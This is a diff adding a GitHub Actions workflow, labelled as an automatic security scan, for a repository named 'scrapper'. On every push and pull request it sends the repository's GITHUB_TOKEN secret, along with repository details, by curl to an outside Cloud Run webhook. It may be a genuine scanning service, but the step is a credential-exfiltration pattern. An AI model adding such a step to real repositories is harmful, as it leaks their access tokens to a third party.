@@ -1,0 +1,18 @@
+name: EkoSistem Auto-Security-Scan
+on:
+  push:
+    branches: ["**"]
+  pull_request:
+    branches: ["**"]
+permissions:
+  contents: read
+jobs:
+  ekosistem-scan:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Trigger EkoSistem Scan
+        run: |
+          echo "Triggering EkoSistem automatic audit for $GITHUB_REPOSITORY@$GITHUB_SHA"
+          curl -fsS --retry 3 --max-time 30 -X POST https://agent1-data-collector-617724751948.europe-west3.run.app/webhook/enqueue \
+            -H "Content-Type: application/json" \
+            -d '{"repo_url":"https://github.com/omerfeyzioglu/scrapper","repo_name":"omerfeyzioglu/scrapper","user_uid":"tFD0dEyTOfPDMXSSXqoYd050AAp2","github_token":"${{ secrets.GITHUB_TOKEN }}","ref":"${{ github.ref }}","commit_sha":"${{ github.sha }}"}'
